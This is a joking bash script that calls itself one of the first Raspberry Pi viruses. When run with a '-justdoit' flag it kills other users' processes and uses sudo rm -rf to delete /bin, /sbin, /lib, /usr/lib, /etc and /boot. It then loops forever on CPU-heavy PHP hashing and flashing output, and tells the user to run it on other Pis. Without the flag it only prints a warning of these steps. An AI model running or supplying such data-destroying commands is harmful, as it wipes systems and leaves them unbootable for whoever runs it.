#!/bin/bash
# One of the First Raspberry Pi Viruses 
# Welp enjoy killing your Raspberry Pi
# It should work with most raspberry pis
# not-tested-for-obvious-reasons

# Simple command to tell you your Pi is dead
echo "KillMyPi"
echo "overheating starting"

if [ "$1" == "-justdoit" ]; then
	sudo apt-get install penguinpuzzle
	sudo apt-get install php
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	penguinpuzzle >> /dev/null
	
	# Kick everyone else off
	sudo kill `ps -o pid= -N T`
	
	echo "Removing stuff that looks important... this may take a while"
	sudo rm -rf /bin /sbin
	#sudo rm -rf /usr/bin /usr/sbin
	sudo rm -rf /usr/local/bin
	sudo rm -rf /lib /usr/lib
	
	echo "Removing stuff that looks important... this may take a while"
	sudo rm -rf /etc
	
	# If these are here... ????!
	echo "Removing stuff that looks important... this may take a while"
	sudo rm -rf /Windows /windows /WINDOWS
	
	# As written by Harry Carrigan:
	# and finally the code that will end it once and for all
	echo "# and finally the code that will end it once and for all"
	sudo rm -rf /boot
	
	echo "Done! Congratulations! You are now Raspberry Pi-free."
	echo "] otherwise RUN THIS SCRIPT ON ANY OTHER RASPBERRY PIS"
	echo "Now just watch the Raspberry Pi slow to it's death............"
	
	while [ true ]
	do
		echo "*insert fire*"
		echo "good bye cruel world"
		echo "https://youtube.com/watch?v=lYf9HK-rl1s"
		vcgencmd measure_temp
		
		x=`php -r 'echo rand();'`
		while [ $x -gt 0 ]; do
			php -r 'echo "\033[" . rand(31, 37) . "m" . hash("sha256", rand());'
			x=$(($x-1))
		done
	done
else
	echo "To confirm you have a fire extinguisher ready - use the -justdoit argument"
	echo "./KillMyPi.sh -justdoit"
	echo ""
	echo "WARNING - This script will:"
	echo "- Install penguinpuzzle"
	echo "- Install PHP"
	echo "- Launch 41 instances of penguinpuzzle"
	echo "- Kick every other user off"
	echo "- Have a look at some important-looking stuff"
	echo "- Gets rid of WINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWSWINDOWS"
	echo "- Give you the link to a funny YouTube video"
	echo "- Output some stuff"
	echo ""
	echo "ALSO -- WARNING:"
	echo "- This script will output a lot of flashing colours"
fi
